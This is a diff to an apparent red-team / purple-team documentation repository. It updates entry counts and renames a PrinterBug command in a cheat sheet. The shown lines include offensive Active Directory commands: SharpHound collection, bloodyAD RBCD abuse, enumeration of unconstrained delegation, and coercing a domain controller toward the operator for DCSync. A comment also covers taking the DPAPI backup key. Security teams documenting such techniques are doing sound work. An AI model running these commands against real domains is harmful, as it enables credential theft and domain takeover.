@@ -14,7 +14,7 @@ entries/red/), which is canonical for them — edit the entry and run
 offensive/companion/gen-views.sh, not the lines here (CI rejects a hand-edit).
 Everything outside the markers is hand-authored as usual.
 
-Most of the corpus is NOT projected here — 19 of its 106 red entries are (24 of 105
+Most of the corpus is NOT projected here — 19 of its 108 red entries are (24 of 107
 blue in PURPLE-TEAM.md). That's deliberate, for three reasons, plus one honest gap:
 
   1. The projected slice is the on-prem AD/Windows OVERLAP, and even inside it some
@@ -32,7 +32,7 @@ blue in PURPLE-TEAM.md). That's deliberate, for three reasons, plus one honest g
          `SharpHound.exe -c All -d <domain> --zipfilename loot`, appears nowhere in this
          file. That single line is the whole residue — which is why this entry sits here
          rather than under the ⚠, where it used to overstate the gap as total.
-  2. The corpus is a deliberate SUPERSET: 59 red entries are cloud / SaaS / CI-CD
+  2. The corpus is a deliberate SUPERSET: 61 red entries are cloud / SaaS / CI-CD
      (AWS, Entra, GCP, Okta, Snowflake, k8s, Jenkins, GitHub/GitLab, npm/PyPI, Vault,
      Terraform Cloud, Cloudflare, Harbor, Google Workspace, Slack) and 13 more are
      C2-egress / Impact. Those have NO counterpart here — this file is organized
@@ -495,7 +495,7 @@ bloodyAD -u <user> -p <password> -d <domain> --host <ip_address> add rbcd <targe
 # Unconstrained delegation — coerce a DC to you (TGT monitor on the unconstrained host) -> DCSync:
 # companion:gen unconstrained-deleg-tgt
 nxc ldap <ip_address> -u <user> -p <password> --trusted-for-delegation
-printerbug <domain>/<user>:<password>@<ip_address> <your-ip>
+printerbug.py <domain>/<user>:<password>@<ip_address> <your-ip>
 # companion:end unconstrained-deleg-tgt
 
 # DPAPI domain backup key — pull once w/ DA, then decrypt any user's secrets offline:
